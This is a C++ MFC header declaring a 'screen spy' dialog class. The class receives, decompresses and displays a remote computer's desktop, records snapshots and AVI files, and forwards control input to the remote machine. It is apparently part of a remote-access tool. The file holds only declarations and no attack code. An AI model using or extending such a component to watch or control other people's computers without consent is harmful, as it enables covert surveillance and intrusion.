#pragma once
#include"../../common/CursorInfo.h"
#include"BmpToAvi.h"
#include"../../libjpeg/jpeglib.h"
#include"IOCPServer.h"
//#include"XvidDec.h"
#pragma comment(lib, "../../libjpeg/turbojpeg-static.lib")
// CDesktopDlg 对话框

typedef DWORD (NTAPI* TRtlDecompressBuffer)
(
	USHORT CompressionFormat,
	PUCHAR UncompressedBuffer,
	ULONG  UncompressedBufferSize,
	PUCHAR CompressedBuffer,
	ULONG  CompressedBufferSize,
	PULONG FinalUncompressedSize
	);

class CDesktopDlg : public CDialog
{
	DECLARE_DYNAMIC(CDesktopDlg)

public:
	CDesktopDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // 标准构造函数
	void OnReceiveComplete();
	void OnReceive();
	virtual ~CDesktopDlg();

	// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SCREENSPY };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()

private:
	HICON	m_hIcon;
	void DrawNextScreenHome();	// 家用办公算法
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	CString m_aviFile; // 如果文件名不为空就写入
	CBmpToAvi	m_aviStream;
	bool m_bIsCtrl = false;
	bool m_bIsFirst = true;
	void SendNext();

	void SendCommand(MSG* pMsg);
	bool SaveSnapshot();
	void SaveAvi();
	//static DWORD WINAPI ShowFPSThread(LPVOID lpParam);
public:
	BITMAPINFO bmpInfo;
	TRtlDecompressBuffer pRtlDecompressBuffer;
	BYTE* pixels = NULL;
	HDC    g_hDcBmp = NULL;
	DWORD With;
	DWORD Height;
	DWORD screenWidth = 0;
	DWORD screenHeight = 0;
	DWORD pixelsWidth = 0;
	DWORD pixelsHeight = 0;
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
	void MyOpen(BYTE falg);
};
